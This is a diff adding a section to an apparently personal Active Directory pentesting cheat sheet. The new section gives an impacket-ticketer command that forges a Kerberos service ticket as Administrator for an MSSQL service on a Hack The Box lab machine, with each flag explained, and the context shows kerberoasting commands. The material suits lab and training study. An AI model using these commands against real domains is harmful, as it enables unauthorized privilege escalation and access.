@@ -9,6 +9,7 @@
 - <<creds, Scenario without creds and with creds>>
 - <<ASREPRoast, ASREPRoast>>
 - <<Kerberoasting, Kerberoasting>>
+- <<Kerberos, Kerberos tickets>>
 - <<SMB, SMB>>
 - <<NTLM, NTLM Relay Attack>>
 - <<Bloodhound, Bloodhound>>
@@ -115,7 +116,33 @@ nxc ldap $target -u 'username' -p 'username' --kerberoastPermisionsing output.tx
 nxc ldap $target -u 'username' -p '' no-preauth-targets kerberoastable.list --kerberoasting output.txt
 ```
 
+[[Kerberos]]
+== Kerberos ticket
 
+This vuln can be exploited by generation ticket as Administrator for different services
+
+```bash
+impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl \
+-domain-sid S-1-5-21-2330692793-3312915120-706255856 \
+-nthash 69596c7aa1e8daee17f8e78870e25a5c \
+-dc-ip 10.129.197.45 \
+-domain breach.vl \
+-user-id 500 Administrator
+```
+
+It's a command that i used in htb machine to generate *Kerberos* ticket as Administrator to `MSSQL` service
+
+`-spn MSSQLSvc/breachdc.breach.vl` -> The Kerberos service you are creating a ticket for.
+
+`-domain-sid S-1-5-21-…` -> The SID of the domain where the ticket belongs.
+
+`-nthash <hash>` -> The NTLM hash used as the cryptographic key to sign the ticket.
+
+`-dc-ip 10.129.197.45` -> The IP address of the domain controller.
+
+`-domain breach.vl` -> The Active Directory domain name.
+
+`-user-id 500` -> The RID of the user (500 = built-in Administrator).
 
 [[SMB]]
 == SMB
